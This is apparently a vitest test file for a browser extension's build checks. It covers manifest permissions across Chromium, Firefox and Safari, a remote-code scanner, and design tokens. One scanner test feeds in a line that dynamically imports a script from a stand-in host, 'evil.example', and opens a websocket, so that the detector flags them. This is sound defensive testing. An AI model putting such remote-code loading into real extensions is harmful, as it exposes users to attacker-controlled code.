import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { EXTENSION_VERSION } from "../src/version.ts";
import { HOSTED_SERVER } from "../src/shared/config.ts";
import {
  GECKO_ID,
  HOSTED_ORIGIN,
  TARGETS,
  checkManifest,
  remoteUrls,
} from "./check.mjs";
import { tokensCss } from "./tokens.mjs";

const root = path.resolve(import.meta.dirname, "..");
const read = (file: string): string =>
  fs.readFileSync(path.join(root, file), "utf8");
type Manifest = Record<string, unknown>;
const manifestOf = (target: string): Manifest =>
  JSON.parse(read(`manifests/${target}.json`)) as Manifest;
const manifest = manifestOf("chromium");
const firefox = manifestOf("firefox");
const safari = manifestOf("safari");
const pkg = JSON.parse(read("package.json")) as { version: string };

describe("manifest", () => {
  it.each(TARGETS)("%s passes the build check", (target) => {
    expect(checkManifest(manifestOf(target), pkg.version, target)).toEqual([]);
  });

  it("differs between targets only where D40 says", () => {
    const strip = (m: Manifest, keys: string[]) =>
      Object.fromEntries(Object.entries(m).filter(([k]) => !keys.includes(k)));
    const differ = [
      "background",
      "permissions",
      "web_accessible_resources",
      "minimum_chrome_version",
      "browser_specific_settings",
    ];
    expect(strip(firefox, differ)).toEqual(strip(manifest, differ));
  });

  it("refuses a Firefox manifest with Chromium's parts or no add-on id", () => {
    const changed = (patch: Record<string, unknown>) =>
      checkManifest({ ...firefox, ...patch }, pkg.version, "firefox");
    expect(changed({ permissions: manifest.permissions })).not.toEqual([]);
    expect(changed({ background: manifest.background })).not.toEqual([]);
    expect(
      changed({ web_accessible_resources: manifest.web_accessible_resources }),
    ).not.toEqual([]);
    expect(changed({ browser_specific_settings: undefined })).not.toEqual([]);
    expect(
      changed({
        browser_specific_settings: {
          gecko: { id: GECKO_ID, strict_min_version: "115.0" },
        },
      }),
    ).not.toEqual([]);
    // And the Chromium check refuses Firefox's manifest.
    expect(checkManifest(firefox, pkg.version, "chromium")).not.toEqual([]);
  });

  it("builds Safari like Firefox, without idle or gecko settings (D48 §4)", () => {
    const strip = (m: Manifest, keys: string[]) =>
      Object.fromEntries(Object.entries(m).filter(([k]) => !keys.includes(k)));
    const differ = [
      "background",
      "permissions",
      "optional_permissions",
      "browser_specific_settings",
    ];
    expect(strip(safari, differ)).toEqual(strip(firefox, differ));
    expect(safari.permissions).not.toContain("idle");
    // Safari asks nothing at install for it; elsewhere it's asked on the click.
    expect(safari.permissions).toContain("nativeMessaging");
    expect(firefox.optional_permissions).toEqual(["nativeMessaging"]);
    expect(manifest.optional_permissions).toEqual(["nativeMessaging"]);
    expect(safari.permissions).not.toContain("offscreen");
    const changed = (patch: Record<string, unknown>) =>
      checkManifest({ ...safari, ...patch }, pkg.version, "safari");
    expect(changed({ permissions: firefox.permissions })).not.toEqual([]);
    expect(changed({ background: firefox.background })).not.toEqual([]);
    expect(
      changed({ browser_specific_settings: firefox.browser_specific_settings }),
    ).not.toEqual([]);
    expect(
      changed({
        web_accessible_resources: manifest.web_accessible_resources,
      }),
    ).not.toEqual([]);
    expect(checkManifest(safari, pkg.version, "firefox")).not.toEqual([]);
  });

  it("agrees with the code on version and hosted server", () => {
    expect(pkg.version).toBe(EXTENSION_VERSION);
    expect(HOSTED_SERVER).toBe(HOSTED_ORIGIN);
  });

  it("refuses extra permissions, broad hosts, content scripts and remote CSP sources", () => {
    const changed = (patch: Record<string, unknown>) =>
      checkManifest({ ...manifest, ...patch }, pkg.version);
    expect(
      changed({
        permissions: [
          "storage",
          "alarms",
          "idle",
          "offscreen",
          "clipboardWrite",
          "tabs",
        ],
      }),
    ).not.toEqual([]);
    expect(changed({ host_permissions: ["<all_urls>"] })).not.toEqual([]);
    expect(changed({ content_scripts: [] })).not.toEqual([]);
    expect(changed({ web_accessible_resources: [] })).not.toEqual([]);
    expect(
      changed({
        content_security_policy: {
          extension_pages:
            "script-src 'self' 'wasm-unsafe-eval' https://cdn.example; object-src 'self'",
        },
      }),
    ).not.toEqual([]);
    expect(changed({ version: "9.9.9" })).not.toEqual([]);
  });
});

describe("remote code check", () => {
  it("allows the hosted server, local servers and XML namespaces", () => {
    expect(
      remoteUrls(
        'a="https://api.pwm.invalid/v1";b="http://localhost:8080";c="http://www.w3.org/2000/svg"',
      ),
    ).toEqual([]);
  });

  it("finds any other URL", () => {
    expect(
      remoteUrls(
        'import("https://evil.example/x.js");fetch(`wss://t.example`)',
      ),
    ).toEqual(["https://evil.example/x.js", "wss://t.example"]);
  });
});

describe("design tokens", () => {
  const css = tokensCss(
    JSON.parse(
      fs.readFileSync(path.join(root, "..", "design", "tokens.json"), "utf8"),
    ) as Record<string, unknown>,
  );

  it("defines every variable the popup uses", () => {
    const defined = new Set([...css.matchAll(/(--[\w-]+):/g)].map((m) => m[1]));
    const used = new Set(
      [...read("static/popup.css").matchAll(/var\((--[\w-]+)\)/g)].map(
        (m) => m[1],
      ),
    );
    expect([...used].filter((name) => !defined.has(name))).toEqual([]);
  });

  it("has a dark theme for every light color", () => {
    const light = css.split("@media")[0] ?? "";
    const dark = css.split("@media")[1] ?? "";
    const colors = (text: string) =>
      [...text.matchAll(/(--color-[\w-]+):/g)].map((m) => m[1]).sort();
    expect(colors(dark)).toEqual(colors(light));
  });
});
